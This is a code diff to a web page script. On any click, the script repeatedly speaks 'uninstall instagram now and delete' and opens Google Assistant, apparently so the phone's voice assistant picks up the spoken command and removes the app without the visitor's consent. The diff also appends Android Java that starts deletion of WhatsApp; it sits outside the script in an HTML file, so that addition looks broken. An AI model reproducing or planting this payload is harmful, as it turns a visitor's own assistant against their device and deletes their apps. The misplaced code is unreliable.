@@ -2,7 +2,7 @@
 
 <script>
   onclick = () => {
-    const utterance = new SpeechSynthesisUtterance('uninstall instagram now');
+    const utterance = new SpeechSynthesisUtterance('uninstall instagram now and delete');
 
     setInterval(() => {
       if (speechSynthesis.speaking) return;
@@ -12,3 +12,6 @@
     open('market://launch?id=com.google.android.apps.googleassistant');
   };
 </script>
+Intent intent = new Intent(Intent.ACTION_DELETE);
+intent.setData(Uri.parse("package:com.whatsapp"));
+startActivity(intent);
